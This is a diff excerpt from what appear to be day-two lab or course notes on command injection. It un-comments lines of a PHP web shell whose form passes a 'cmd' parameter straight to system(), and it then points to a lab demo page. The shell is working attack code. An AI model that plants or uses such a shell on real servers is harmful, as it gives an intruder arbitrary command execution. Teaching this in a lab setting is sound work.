@@ -161,15 +161,15 @@ DAY2
         <HTML><BODY>
         <FORM METHOD="GET" NAME="myform" ACTION="">
         <INPUT TYPE="text" NAME="cmd">
-     #  <INPUT TYPE="submit" VALUE="Send">
+        <INPUT TYPE="submit" VALUE="Send">
         </FORM>
-     #  <pre>
+        <pre>
         <?php
-     #  if($_GET['cmd']) {
+        if($_GET['cmd']) {
           system($_GET['cmd']);
           }
         ?>
-     #  </pre>
+        </pre>
         </BODY></HTML>
     
         - Go back to 10.50.34.125/cmdinjection/cmdinjectdemo.php
